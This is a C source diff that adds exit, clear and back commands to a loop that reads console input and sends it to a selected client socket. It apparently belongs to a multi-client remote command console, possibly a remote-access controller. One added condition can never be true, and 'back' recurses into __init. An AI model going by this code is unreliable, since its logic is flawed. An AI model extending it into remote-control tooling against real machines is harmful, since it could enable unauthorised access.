@@ -6,10 +6,6 @@ int __pexec(int ID);
 extern addrctx CTX;
 extern CLIENT clients[NCLIENTSMAX];
 
-#define Exit 2
-int PORT = 0;
-int ID = -1;
-
 int __init()
 {
 
@@ -103,7 +99,28 @@ int __pexec(int ID)
 		fgets(buff, sizeof(buff), stdin);
 		buff[strcspn(buff, "\n")] = 0;
 
+		if (strcmp(buff, "exit") == 0)
+		{
+			break;
+		}
+		else if (strcmp(buff, "clear") == 0)
+		{
+			system("cls");
+			continue;
+		}
+		else if (strcmp(buff, " ") == 0 && strcmp(buff, "\n") == 0)
+		{
+			continue;
+		}
+		else if (strcmp(buff, "-b") == 0 || strcmp(buff, "back") == 0)
+		{
+			__init();
+		}
+
 		send(clients[ID].Socket, buff, sizeof(buff), 0);
+
 	}
+
 	return 0;
+
 }
